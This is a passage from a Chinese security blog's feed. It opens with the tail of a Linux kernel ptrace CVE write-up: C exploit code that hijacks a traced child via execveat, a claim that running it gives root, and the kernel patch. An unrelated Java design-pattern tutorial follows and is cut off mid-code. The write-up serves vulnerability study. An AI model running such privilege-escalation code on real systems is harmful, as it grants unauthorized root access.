class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" alt="image.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>Jann Horn 提交的漏洞修复方案比较简单，如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">index 8456b6e2205f7..705887f63288d 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/ptrace.c</span></span><br><span class="line"><span class="meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-rcu_read_lock();</span></span><br><span class="line"><span class="deletion">-__ptrace_link(child, new_parent, __task_cred(new_parent));</span></span><br><span class="line"><span class="deletion">-rcu_read_unlock();</span></span><br><span class="line"><span class="addition">+__ptrace_link(child, new_parent, current_cred());</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们可以看出这个补丁只做了一件小事：</p><ul><li><strong>不使用 rcu 机制，将 ptracee-&gt;parent_cred 设为当前进程 cred，即 ptracee 原来的 cred</strong></li></ul><p>这将 ptracer 的权限限制为发起 ptrace 请求的 ptracee 的权限，笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你不许说他，他是你爹？&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="ptrace" scheme="http://blog.arttnba3.cn/tags/ptrace/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x02】软件工程：设计模式浅析</title>
    <link href="http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/"/>
    <id>http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/</id>
    <published>2022-01-03T16:50:06.000Z</published>
    <updated>2022-03-08T15:47:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实👴不会写代码</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>先来一段面向 Wikipedia 的废话（</p><blockquote><p>在软件工程中，设计模式（design pattern）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。这个术语是由埃里希·伽玛（Erich Gamma）等人在1990年代从建筑设计领域引入到计算机科学的。</p><p>设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。</p><p>并非所有的软件模式都是设计模式，设计模式特指软件“设计”层次上的问题。还有其他非设计模式的模式，如架构模式。同时，<strong>算法不能算是一种设计模式</strong>，因为算法主要是用来解决计算上的问题，而非设计上的问题。</p><p><a href="https://zh.wikipedia.org/wiki/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F_(%E8%AE%A1%E7%AE%97%E6%9C%BA)">设计模式 (计算机) - 维基百科，自由的百科全书 (wikipedia.org)</a></p></blockquote><p>笔者本身也不是软工专业的，所以下文中笔者的拙见可能有误，还望读者不吝指正。</p></blockquote><p>在笔者看来，通俗地来说，<strong>设计模式</strong>（design pattern）就是<strong>软件的架构设计问题</strong>——我们在如何去设计、组织一个软件的架构</p><p>当我们谈论到设计模式这一词语时，我们通常是基于<strong>面向对象程序设计</strong>（Object Oriented Programming）这一基础出发，而非传统的_面向过程的程序设计_，这意味着设计模式是软件设计的<strong>抽象层面</strong>——即<strong>我们并不关注细节的实现，而是关注于更高一层的组织</strong></p><p>方便起见，本篇笔者选用“最面向对象的语言”—— Java 语言来讲解不同的设计模式</p><h2 id="设计模式的类别"><a href="#设计模式的类别" class="headerlink" title="设计模式的类别"></a>设计模式的类别</h2><p>在《<strong>设计模式：可复用面向对象软件的基础</strong>》（Design Patterns: Elements of Reusable Object-Oriented Software）一书中，GoF 总结了<strong>23种设计模式</strong>，分为三大类：</p><h3 id="创建型模式（5种）"><a href="#创建型模式（5种）" class="headerlink" title="创建型模式（5种）"></a>创建型模式（5种）</h3><ul><li>工厂方法模式</li><li>抽象工厂模式</li><li>单例模式</li><li>建造者模式</li><li>原型模式</li></ul><h3 id="结构型模式（7种）"><a href="#结构型模式（7种）" class="headerlink" title="结构型模式（7种）"></a>结构型模式（7种）</h3><ul><li>适配器模式</li><li>装饰器模式</li><li>代理模式</li><li>外观模式</li><li>桥接模式</li><li>组合模式</li><li>享元模式</li></ul><h3 id="行为型模式（11种）"><a href="#行为型模式（11种）" class="headerlink" title="行为型模式（11种）"></a>行为型模式（11种）</h3><ul><li>策略模式</li><li>模板方法模式</li><li>观察者模式</li><li>迭代子模式</li><li>责任链模式</li><li>命令模式</li><li>备忘录模式</li><li>状态模式</li><li>访问者模式</li><li>中介者模式</li><li>解释器模式</li></ul><p>随着现代软件设计理论的发展，更多的设计模式也被开发了出来，除了书上所述的上述三大类都分别新增有设计模式之外，针对于多线程与并发软件设计，还新增了一个<strong>并发型模式</strong>，以及由 Sun Java Center 鉴定的 J2EE模式等等…</p><p>本篇主要还是讲书上的23种设计模式，额外的设计模式如果有时间可能也会讲讲</p><blockquote><p>其实笔者本人也还没买钱这本书…（<del>体谅一哈，👴是学生，建议v👴200</del>）</p></blockquote><h1 id="0x01-创建型模式"><a href="#0x01-创建型模式" class="headerlink" title="0x01.创建型模式"></a>0x01.创建型模式</h1><p>在软件工程中，创建型模式是用以处理<strong>对象创建</strong>的设计模式，该类别模式根据实际情况使用合适的方式创建对象，因为基本的对象创建方式可能会导致设计上的问题，或增加设计的复杂度</p><p>创建型模式的关注点是<strong>如何创建对象</strong>，其核心思想是要<strong>把对象的创建和使用相分离</strong></p><blockquote><p>例如，当我们在C++中使用 string 类的各种方法时，我们并不需要关注其底层（allocator、扩容…）是如何实现的</p></blockquote><h2 id="一、工厂方法模式（Factory-method-pattern）"><a href="#一、工厂方法模式（Factory-method-pattern）" class="headerlink" title="一、工厂方法模式（Factory method pattern）"></a>一、工厂方法模式（Factory method pattern）</h2><p>工厂方法模式通常又简称工厂模式，该设计模式引入了一种名为“工厂”的概念——_<strong>由一个“工厂”来“生产”出我们所需要的对象</strong>_</p><p>在工厂模式中，我们<strong>将对象的创建与对象的使用进行分开</strong>，当我们需要创建一个对象时，我们首先需要创建一个“工厂类”对象实例，后续的对象创建都从该“工厂”中获得</p><p>下图是<del>笔者偷的</del>一张描述工厂模式的图</p><p>假设我们现在要帮 Apple 设计一个生产工厂来生产最新的 iPhone13 和 iPad5，步骤如下：</p><h3 id="I-物品接口"><a href="#I-物品接口" class="headerlink" title="I.物品接口"></a>I.物品接口</h3><p>我们首先需要定义我们“生产”的对象的类型，例如，我们这个生产工厂可以生产 iPhone13 和 iPad5，那么我们这里便定义一个_设备类的接口类_作为不同产品的接口，同时声明一些这些设备共有的方法，这里随便定义两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-工厂接口"><a href="#II-工厂接口" class="headerlink" title="II.工厂接口"></a>II.工厂接口</h3><p>要实现不同类型的工厂，我们通常需要先定义一个工厂类的接口类，我们要“生产”的是电子设备，那就叫_DeviceFactor_ 好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-物品实体类"><a href="#III-物品实体类" class="headerlink" title="III.物品实体类"></a>III.物品实体类</h3><p>有了物品接口，我们可以开始定义相应的设备了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="IV-工厂类"><a href="#IV-工厂类" class="headerlink" title="IV.工厂类"></a>IV.工厂类</h3><p>有了工厂接口与物品接口，我们可以开始实现我们的工厂类了，对于 iPhone 而言我们需要一个 iPhone13Factory，而对于 iPad5 我们则需要一个独立的 iPad5 工厂，相应地这两个工厂都要实现 DeviceFactory 接口的 <code>createDevice()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPhone13 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPad5 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-工厂方法模式的工作方式"><a href="#O-工厂方法模式的工作方式" class="headerlink" title="O.工厂方法模式的工作方式"></a><em>O.工厂方法模式的工作方式</em></h3><p>以下测试主程序用以说明工厂方法模式如何工作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryMethodMode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhone13Factory</span> <span class="variable">iphone_13_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPhone13Factory</span>();</span><br><span class="line">        <span class="type">iPad5Factory</span> <span class="variable">ipad_5_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPad5Factory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone13</span> <span class="variable">iphone13</span> <span class="operator">=</span> iphone_13_factory.createDevice();</span><br><span class="line">        <span class="type">iPad5</span> <span class="variable">ipad5</span> <span class="operator">=</span> ipad_5_factory.createDevice();</span><br><span class="line"></span><br><span class="line">        iphone13.showScreen();</span><br><span class="line">        ipad5.showScreen();</span><br><span class="line"></span><br><span class="line">        iphone13.reboot();</span><br><span class="line">        ipad5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="二、抽象工厂模式（Abstract-factory-pattern）"><a href="#二、抽象工厂模式（Abstract-factory-pattern）" class="headerlink" title="二、抽象工厂模式（Abstract factory pattern）"></a>二、抽象工厂模式（Abstract factory pattern）</h2><p>抽象工厂模式与工厂模式相类似，不同的是，在工厂模式中，我们以_独立的对象种类_来创建工厂（例如 iPhone13和 iPad5），而在抽象工厂模式中，则以<strong>同一种类别的对象</strong>作为划分的依据——<strong>每一类对象都有一个工厂，该工厂生产同一类别的不同种类的对象实例</strong></p><p><img src="https://s2.loli.net/2022/01/04/PKxLXrTFRpWiNZg.png" alt="偷的图"></p><p>还是拿 Apple 的工厂做例子，这里我们有两条生产线：一条生产全系 iPhone，另一条生产全系 iPad</p><h3 id="I-物品接口-1"><a href="#I-物品接口-1" class="headerlink" title="I.物品接口"></a>I.物品接口</h3><p>我们首先需要定义我们“生产”的对象的类型，例如，我们这个生产工厂可以生产各系 iPhone 和 iPad，那么我们这里便定义一个_设备类的接口类_作为不同产品的接口，同时声明一些这些设备<strong>共有</strong>的方法，这里随便定义两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于 Device 类，我们再定义两个<strong>抽象类</strong>——iPhone 和 iPad</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPhone</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPad</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-工厂接口-1"><a href="#II-工厂接口-1" class="headerlink" title="II.工厂接口"></a>II.工厂接口</h3><p>要实现不同类型的工厂，我们通常需要先定义一个工厂类的接口类，我们要“生产”的是电子设备，那就叫_DeviceFactor_ 好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-物品实体类-1"><a href="#III-物品实体类-1" class="headerlink" title="III.物品实体类"></a>III.物品实体类</h3><p>有了 iPhone 和 iPad 这两个抽象类，我们便可以定义具体的设备了，比如 iPhone13 类和 iPad 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">extends</span> <span class="title class_">iPhone</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">extends</span> <span class="title class_">iPad</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IV-工厂类-1"><a href="#IV-工厂类-1" class="headerlink" title="IV.工厂类"></a>IV.工厂类</h3><p>有了工厂接口与物品接口，我们可以开始实现我们的工厂类了，对于 iPhone 而言我们需要一个 iPhoneFactory，而对于 iPad 我们则需要一个独立的 iPad 工厂，相应地这两个工厂都要实现工厂接口的 <code>createDevice()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhoneFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">13</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPadFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-抽象工厂模式的工作方式"><a href="#O-抽象工厂模式的工作方式" class="headerlink" title="O.抽象工厂模式的工作方式"></a><em>O.抽象工厂模式的工作方式</em></h3><p>以下测试主程序用以说明工厂方法模式如何工作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryPattern</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhoneFactory</span> <span class="variable">iphone_factory</span> <span class="operator">=</span> <span 